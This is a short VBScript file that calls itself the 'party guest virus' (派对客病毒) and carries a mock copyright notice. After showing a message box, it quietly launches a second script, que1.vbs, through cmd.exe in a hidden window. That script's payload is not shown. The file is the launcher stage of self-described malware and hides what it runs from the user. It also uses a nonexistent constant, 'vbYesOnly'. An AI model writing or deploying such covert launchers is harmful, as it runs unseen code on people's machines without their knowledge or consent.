Dim ans
ans = MsgBox("派对客病毒 [版本 2.1.5.0622]" & Chr(13) & "版权所有 (C) 2023 | PHR 小蚂蚁(R)集团 晨光武器 Backrooms后室。" & Chr(13) & "保留所有权利。", vbYesOnly + vbInformation, "Copyright")

Set WSShell = CreateObject("WScript.Shell")
WSShell.Run "cmd.exe /c start """" ""que1.vbs""", 0, True